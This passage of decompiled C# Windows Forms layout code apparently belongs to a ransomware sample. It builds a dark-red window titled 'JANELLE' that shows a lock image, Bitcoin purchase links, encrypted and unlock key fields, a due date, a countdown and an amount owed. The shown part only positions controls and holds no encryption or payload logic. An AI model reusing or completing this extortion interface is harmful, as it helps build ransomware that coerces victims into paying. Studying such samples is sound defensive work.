		((Control)_duetimeleft).set_Location(new Point(35, 280));
		((Control)_duetimeleft).set_Name("_duetimeleft");
		((Control)_duetimeleft).set_Size(new Size(59, 19));
		((Control)_duetimeleft).set_TabIndex(17);
		((Control)_duetimeleft).set_Text("label1");
		((Control)linkLabel1).set_AutoSize(true);
		linkLabel1.set_LinkColor(Color.FromArgb(224, 224, 224));
		((Control)linkLabel1).set_Location(new Point(25, 570));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(70, 13));
		((Control)linkLabel1).set_TabIndex(23);
		linkLabel1.set_TabStop(true);
		((Control)linkLabel1).set_Text("About Bitcoin");
		linkLabel1.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked));
		((Control)linkLabel2).set_AutoSize(true);
		linkLabel2.set_LinkColor(Color.FromArgb(224, 224, 224));
		((Control)linkLabel2).set_Location(new Point(24, 596));
		((Control)linkLabel2).set_Name("linkLabel2");
		((Control)linkLabel2).set_Size(new Size(101, 13));
		((Control)linkLabel2).set_TabIndex(24);
		linkLabel2.set_TabStop(true);
		((Control)linkLabel2).set_Text("How To Buy Bitcoin");
		linkLabel2.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel2_LinkClicked));
		((Control)linkLabel3).set_AutoSize(true);
		linkLabel3.set_LinkColor(Color.FromArgb(224, 224, 224));
		((Control)linkLabel3).set_Location(new Point(25, 625));
		((Control)linkLabel3).set_Name("linkLabel3");
		((Control)linkLabel3).set_Size(new Size(60, 13));
		((Control)linkLabel3).set_TabIndex(25);
		linkLabel3.set_TabStop(true);
		((Control)linkLabel3).set_Text("Contact Us");
		linkLabel3.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel3_LinkClicked));
		panel1.set_BorderStyle((BorderStyle)1);
		((Control)panel1).set_Location(new Point(18, 174));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(200, 145));
		((Control)panel1).set_TabIndex(26);
		panel2.set_BorderStyle((BorderStyle)1);
		((Control)panel2).set_Location(new Point(16, 325));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(200, 145));
		((Control)panel2).set_TabIndex(27);
		((ListControl)languages).set_FormattingEnabled(true);
		((Control)languages).set_Location(new Point(782, 20));
		((Control)languages).set_Name("languages");
		((Control)languages).set_Size(new Size(121, 21));
		((Control)languages).set_TabIndex(28);
		languages.add_SelectedIndexChanged((EventHandler)languages_SelectedIndexChanged);
		pictureBox2.set_Image((Image)(object)Resources.bitcoin1);
		((Control)pictureBox2).set_Location(new Point(244, 513));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(167, 60));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(10);
		pictureBox2.set_TabStop(false);
		pictureBox1.set_Image((Image)(object)Resources.lock1);
		((Control)pictureBox1).set_Location(new Point(39, 20));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(154, 148));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(4);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((ScrollableControl)this).set_AutoScrollMargin(new Size(100, 100));
		((Control)this).set_BackColor(Color.DarkRed);
		((Form)this).set_ClientSize(new Size(915, 685));
		((Control)this).get_Controls().Add((Control)(object)languages);
		((Control)this).get_Controls().Add((Control)(object)linkLabel3);
		((Control)this).get_Controls().Add((Control)(object)linkLabel2);
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Control)this).get_Controls().Add((Control)(object)_ammount);
		((Control)this).get_Controls().Add((Control)(object)_datelosttimeleft);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)_datelost);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)_duetimeleft);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)encrypted_key);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)unlock_key);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)bitcoin);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)_duedate);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)content);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("JANELLE");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
